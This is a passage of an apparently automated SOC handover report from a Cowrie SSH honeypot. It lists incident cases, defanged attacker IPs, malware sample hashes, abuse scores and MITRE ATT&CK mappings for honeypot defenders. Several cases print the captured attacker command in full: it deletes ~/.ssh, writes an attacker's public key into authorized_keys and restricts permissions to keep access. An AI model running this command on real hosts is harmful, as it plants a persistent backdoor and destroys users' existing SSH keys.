| `2026-04-14 18:06:17` | `cowrie.login.success` |
| `2026-04-14 18:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d3d14ced10

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 18:07 |
| **Last Seen** | 2026-04-14 18:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:07:35` | `cowrie.session.connect` |
| `2026-04-14 18:07:35` | `cowrie.client.version` |
| `2026-04-14 18:07:35` | `cowrie.client.kex` |
| `2026-04-14 18:07:35` | `cowrie.login.success` |
| `2026-04-14 18:07:35` | `cowrie.session.params` |
| `2026-04-14 18:07:35` | `cowrie.command.input` |
| `2026-04-14 18:07:35` | `cowrie.command.failed` |
| `2026-04-14 18:07:35` | `cowrie.log.closed` |
| `2026-04-14 18:07:36` | `cowrie.session.params` |
| `2026-04-14 18:07:36` | `cowrie.command.input` |
| `2026-04-14 18:07:36` | `cowrie.session.file_download` |
| `2026-04-14 18:07:36` | `cowrie.log.closed` |
| `2026-04-14 18:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614d055de62e

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 18:07 |
| **Last Seen** | 2026-04-14 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:07:37` | `cowrie.session.connect` |
| `2026-04-14 18:07:37` | `cowrie.client.version` |
| `2026-04-14 18:07:37` | `cowrie.client.kex` |
| `2026-04-14 18:07:37` | `cowrie.login.success` |
| `2026-04-14 18:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a585cad80f

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:08 |
| **Last Seen** | 2026-04-14 18:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:08:43` | `cowrie.session.connect` |
| `2026-04-14 18:08:43` | `cowrie.client.version` |
| `2026-04-14 18:08:43` | `cowrie.client.kex` |
| `2026-04-14 18:08:44` | `cowrie.login.success` |
| `2026-04-14 18:08:44` | `cowrie.session.params` |
| `2026-04-14 18:08:44` | `cowrie.command.input` |
| `2026-04-14 18:08:44` | `cowrie.command.failed` |
| `2026-04-14 18:08:45` | `cowrie.log.closed` |
| `2026-04-14 18:08:45` | `cowrie.session.params` |
| `2026-04-14 18:08:45` | `cowrie.command.input` |
| `2026-04-14 18:08:45` | `cowrie.session.file_download` |
| `2026-04-14 18:08:45` | `cowrie.log.closed` |
| `2026-04-14 18:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d09a1726e15

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:08 |
| **Last Seen** | 2026-04-14 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:08:48` | `cowrie.session.connect` |
| `2026-04-14 18:08:48` | `cowrie.client.version` |
| `2026-04-14 18:08:48` | `cowrie.client.kex` |
| `2026-04-14 18:08:49` | `cowrie.login.success` |
| `2026-04-14 18:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeab4bb88f77

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:11 |
| **Last Seen** | 2026-04-14 18:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:11:09` | `cowrie.session.connect` |
| `2026-04-14 18:11:09` | `cowrie.client.version` |
| `2026-04-14 18:11:10` | `cowrie.client.kex` |
| `2026-04-14 18:11:11` | `cowrie.login.success` |
| `2026-04-14 18:11:12` | `cowrie.session.params` |
| `2026-04-14 18:11:12` | `cowrie.command.input` |
| `2026-04-14 18:11:12` | `cowrie.command.failed` |
| `2026-04-14 18:11:12` | `cowrie.log.closed` |
| `2026-04-14 18:11:13` | `cowrie.session.params` |
| `2026-04-14 18:11:13` | `cowrie.command.input` |
| `2026-04-14 18:11:13` | `cowrie.session.file_download` |
| `2026-04-14 18:11:13` | `cowrie.log.closed` |
| `2026-04-14 18:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df223331d8e

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:11 |
| **Last Seen** | 2026-04-14 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:11:16` | `cowrie.session.connect` |
| `2026-04-14 18:11:16` | `cowrie.client.version` |
| `2026-04-14 18:11:16` | `cowrie.client.kex` |
| `2026-04-14 18:11:17` | `cowrie.login.success` |
| `2026-04-14 18:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b4ac797b623

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:13 |
| **Last Seen** | 2026-04-14 18:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:13:40` | `cowrie.session.connect` |
| `2026-04-14 18:13:40` | `cowrie.client.version` |
| `2026-04-14 18:13:40` | `cowrie.client.kex` |
| `2026-04-14 18:13:41` | `cowrie.login.success` |
| `2026-04-14 18:13:42` | `cowrie.session.params` |
| `2026-04-14 18:13:42` | `cowrie.command.input` |
| `2026-04-14 18:13:42` | `cowrie.command.failed` |
| `2026-04-14 18:13:42` | `cowrie.log.closed` |
| `2026-04-14 18:13:42` | `cowrie.session.params` |
| `2026-04-14 18:13:42` | `cowrie.command.input` |
| `2026-04-14 18:13:42` | `cowrie.session.file_download` |
| `2026-04-14 18:13:42` | `cowrie.log.closed` |
| `2026-04-14 18:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76dc1da69e4c

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:13 |
| **Last Seen** | 2026-04-14 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:13:45` | `cowrie.session.connect` |
| `2026-04-14 18:13:45` | `cowrie.client.version` |
| `2026-04-14 18:13:46` | `cowrie.client.kex` |
| `2026-04-14 18:13:47` | `cowrie.login.success` |
| `2026-04-14 18:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d83d46b4aa0

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:16 |
| **Last Seen** | 2026-04-14 18:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:16:06` | `cowrie.session.connect` |
| `2026-04-14 18:16:06` | `cowrie.client.version` |
| `2026-04-14 18:16:06` | `cowrie.client.kex` |
| `2026-04-14 18:16:07` | `cowrie.login.success` |
| `2026-04-14 18:16:08` | `cowrie.session.params` |
| `2026-04-14 18:16:08` | `cowrie.command.input` |
| `2026-04-14 18:16:08` | `cowrie.command.failed` |
| `2026-04-14 18:16:08` | `cowrie.log.closed` |
| `2026-04-14 18:16:09` | `cowrie.session.params` |
| `2026-04-14 18:16:09` | `cowrie.command.input` |
| `2026-04-14 18:16:09` | `cowrie.session.file_download` |
| `2026-04-14 18:16:09` | `cowrie.log.closed` |
| `2026-04-14 18:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-588e81fba09d

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:16 |
| **Last Seen** | 2026-04-14 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:16:12` | `cowrie.session.connect` |
| `2026-04-14 18:16:12` | `cowrie.client.version` |
| `2026-04-14 18:16:12` | `cowrie.client.kex` |
| `2026-04-14 18:16:13` | `cowrie.login.success` |
| `2026-04-14 18:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.220.244[.]134` | **27** | 2026-04-14 17:18 | 2026-04-14 17:36 | 39m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.146.159[.]14` | **25** | 2026-04-14 17:20 | 2026-04-14 18:01 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.23.198[.]86` | **25** | 2026-04-14 17:19 | 2026-04-14 18:21 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.33[.]228` | **25** | 2026-04-14 17:21 | 2026-04-14 17:59 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `38.19.156[.]18` | **25** | 2026-04-14 17:19 | 2026-04-14 18:03 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.163.127[.]183` | **25** | 2026-04-14 17:25 | 2026-04-14 18:09 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.64.85[.]138` | **2** | 2026-04-14 17:24 | 2026-04-14 17:27 | 2m | 0 | `T1592` | 🟢 LOW |
| `106.37.72[.]234` | 1 | 2026-04-14 17:19 | 2026-04-14 17:21 | 105s | 0 | `T1592` | 🟢 LOW |
| `115.190.162[.]240` | 1 | 2026-04-14 19:19 | 2026-04-14 19:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-04-14 17:25 | 2026-04-14 17:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-04-14 17:25 | 2026-04-14 17:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.19.243[.]145` | 1 | 2026-04-14 17:25 | 2026-04-14 17:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.71.104[.]224` | 1 | 2026-04-14 19:12 | 2026-04-14 19:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.184.82[.]249` | 1 | 2026-04-14 19:19 | 2026-04-14 19:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `210.227.200[.]121` | 1 | 2026-04-14 17:51 | 2026-04-14 17:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `78.89.154[.]59` | 1 | 2026-04-14 17:22 | 2026-04-14 17:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.227.200[.]121` | JP | Open Computer Network | **100** ⚠️ | 9 |
| `43.163.127[.]183` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 1 |
| `118.193.33[.]228` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 44 |
| `167.71.104[.]224` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `115.190.162[.]240` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `180.184.82[.]249` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.80[.]70` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 49 |
| `120.48.20[.]170` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.23.198[.]86` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 308 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 147 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 134 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 75 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 75 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 315 cases |
| Tool 34  | Credential Extractor        | ✅ 281 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (1.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 147 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 154 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T19:23:18Z_
